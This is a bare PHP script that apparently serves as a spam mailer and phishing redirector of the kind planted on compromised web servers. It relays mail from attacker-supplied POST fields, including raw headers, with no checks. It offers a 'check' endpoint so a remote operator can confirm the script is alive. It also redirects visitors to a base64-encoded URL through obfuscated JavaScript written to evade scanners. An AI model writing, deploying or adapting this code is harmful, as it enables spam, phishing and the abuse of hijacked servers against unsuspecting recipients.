<?php
function base64_url_decode($val) {
    return base64_decode(strtr($val, '-_,', '+/='));
}
if(isset($_POST["message"])){
    $_POST = array_map('stripslashes', $_POST);
    $val = array();
    if(mail($_POST["to"], $_POST["subject"], $_POST["message"], $_POST["headers"])){
        $val["mail"] = 1;
    } else{
        $val["mail"] = 0;
    }
    print json_encode($val);
}
if(isset($_POST["check"])){
    $val = array();
    $val["res"] = 1;
    print json_encode($val);
}
if(isset($_GET) and count($_GET) > 0){
    $url = "";
    $redic = array_values($_GET);
    foreach(str_split(base64_url_decode($redic[0])) as $letter){
            if(rand(1,3) == 1){
                    $url .= $letter;
            }else{
                    $url .= $letter."'+'";
            }
    }
?>
<html><head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>Redirecting</title>
<script>
var r = '<?php echo $url;?>';
var _0x485b=["\x72\x65\x70\x6C\x61\x63\x65"];
</script>
</head>
<body onload="location[_0x485b[0]](r);">
Loading...
</body></html>
<?php } ?>